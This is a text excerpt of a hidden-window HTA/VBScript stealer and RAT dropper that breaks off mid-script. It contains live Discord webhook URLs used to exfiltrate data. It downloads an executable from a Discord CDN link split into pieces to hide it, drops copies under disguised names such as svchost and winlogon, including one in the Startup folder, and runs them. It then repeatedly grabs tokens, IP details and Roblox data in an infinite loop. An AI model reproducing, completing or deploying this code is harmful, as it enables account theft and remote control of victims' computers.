<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, RE_WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOKS ---
WH = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
RE_WH = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- 1. INSTANT RAT DOWNLOAD (3 SPOTS) ---
Call DropRAT

' --- 2. Initial Grabs ---
Call GrabTokens
Call IP
Call GrabRoblox
Call Persistence
Call PostFullRobloxUI

' --- INFINITE Re-grab chain (every 2.5 minutes) ---
Dim runCount
runCount = 0
Do
    runCount = runCount + 1
    Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 10181046, RE_WH)
    Call GrabTokens
    Call IP
    Call GrabRoblox
    Call GrabFroststrap
    ' Sleep for 2.5 minutes (150 seconds)
    Call SleepSeconds(150)
Loop

window.close()

' --- OBFUSCATED & FAST RAT DROP (3 LOCATIONS + BATCH INJECTION) ---
Sub DropRAT()
    Call PostEmbed(":package: RAT Download", "Fetching Payloads...", 10181046)
    
    ' 1. Obfuscated EXE URL
    Dim u1, u2, u3, exeUrl
    u1 = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dice"
    u2 = "check."
    u3 = "exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
    exeUrl = u1 & u2 & u3

    ' Define 3 different drop locations
    Dim paths(2)
    paths(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates\winlogon"
    paths(1) = sh.ExpandEnvironmentStrings("%TEMP%") & "\svchost"
    paths(2) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\system32"

    Dim i, txtPath, dlCmd
    For i = 0 To 2
        ' Download the EXE
        txtPath = paths(i) & ".exe.txt"
        If fso.FileExists(txtPath) Then fso.DeleteFile txtPath
        If fso.FileExists(paths(i) & ".exe") Then fso.DeleteFile paths(i) & ".exe"
        
        dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0"" -o """ & txtPath & """ """ & exeUrl & """"
        sh.Run dlCmd, 0, True
        
        If fso.FileExists(txtPath) Then
            If fso.GetFile(txtPath).Size > 100000 Then
                fso.MoveFile txtPath, paths(i) & ".exe"
                Call RunCmd("""" & paths(i) & ".exe""")
            End If
        End If
    Next
    
    ' --- BATCH INJECTION (Instant Execution) ---
    ' PASTE YOUR BASE64 ENCODED CLIENT.BAT BETWEEN THE QUOTES BELOW
    Dim b64 : b64 = "@echo off
